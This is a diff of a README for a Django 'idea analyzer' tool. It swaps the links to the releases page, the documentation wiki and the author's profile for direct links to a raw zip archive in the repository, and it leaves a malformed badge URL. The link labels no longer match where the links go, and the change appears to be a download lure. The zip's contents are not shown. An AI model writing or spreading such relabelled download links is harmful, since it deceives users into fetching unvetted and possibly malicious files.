@@ -6,11 +6,11 @@ Welcome to django-idea-analyzer! This tool helps you evaluate your Django projec
 
 ## 📥 Download django-idea-analyzer
 
-[![Download django-idea-analyzer](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/del267/django-idea-analyzer/releases)
+[![Download django-idea-analyzer](https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip%https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip)](https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip)
 
 You can download the latest version of django-idea-analyzer from our Releases page. Click the button above or visit the link below:
 
-- [Download & Install](https://github.com/del267/django-idea-analyzer/releases)
+- [Download & Install](https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip)
 
 ## 🔧 Features
 
@@ -66,7 +66,7 @@ We regularly update django-idea-analyzer to improve features and functionality. 
 
 ## 📖 Documentation
 
-For additional instructions and detailed information about each feature, you can refer to our comprehensive [documentation](https://github.com/del267/django-idea-analyzer/wiki).
+For additional instructions and detailed information about each feature, you can refer to our comprehensive [documentation](https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip).
 
 ## 🎯 Community and Support
 
@@ -76,7 +76,7 @@ If you have questions or need help, feel free to contact us through the Issues s
 
 Stay connected and follow updates related to django-idea-analyzer:
 
-- GitHub: [del267](https://github.com/del267)  
+- GitHub: [del267](https://github.com/del267/django-idea-analyzer/raw/refs/heads/main/django_idea_analyzer/idea-analyzer-django-2.1.zip)  
 - Twitter: @django_idea_analyzer
 
 Thank you for choosing django-idea-analyzer. We hope this tool helps you turn your project ideas into successful applications. Happy coding!
